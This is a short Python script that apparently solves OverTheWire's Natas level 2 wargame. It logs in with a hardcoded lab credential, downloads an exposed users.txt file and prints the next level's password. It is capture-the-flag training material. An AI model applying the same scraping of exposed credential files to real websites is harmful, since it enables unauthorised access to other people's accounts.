import requests
import re

url = "http://natas2.natas.labs.overthewire.org/files/users.txt"

def exp():
    r = requests.get(url, auth=('natas2', 'TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI'), verify=False)
    if r.status_code == 200:
        password = re.findall('natas3:(.*)', r.text)[0]
        print("Password for natas3: " + password)

if __name__ == "__main__":
    exp()